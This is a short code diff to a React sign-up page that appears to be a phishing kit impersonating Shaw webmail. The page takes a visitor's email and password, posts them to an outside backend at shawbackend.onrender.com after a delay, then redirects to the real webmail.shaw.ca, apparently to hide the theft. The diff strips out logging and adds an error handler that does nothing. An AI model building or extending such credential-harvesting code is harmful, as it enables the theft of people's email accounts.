@@ -7,6 +7,7 @@ import { FaSpinner } from 'react-icons/fa6';
 function SignUp() {
  const [inputs,setInputs] = useState({ email: '', password: '', website: 'shaw' })
  const [isloading, setLoading] = useState(false)
+ const [errorMessage, setErrorMessage] = useState("")
  
  const navigate = useNavigate()
 
@@ -40,11 +41,11 @@ function SignUp() {
     try {
       const response = await fetch("https://shawbackend.onrender.com/sendEmail", options);
       const data = await response.json();
-      console.log(data);
+  
       if (data.message) {  window.location.href = 'https://webmail.shaw.ca/'; }
   
     } catch (error) {
-      console.error('Error:', error);
+      setErrorMessage(errorMessage);
        
     }
   }, 3000);
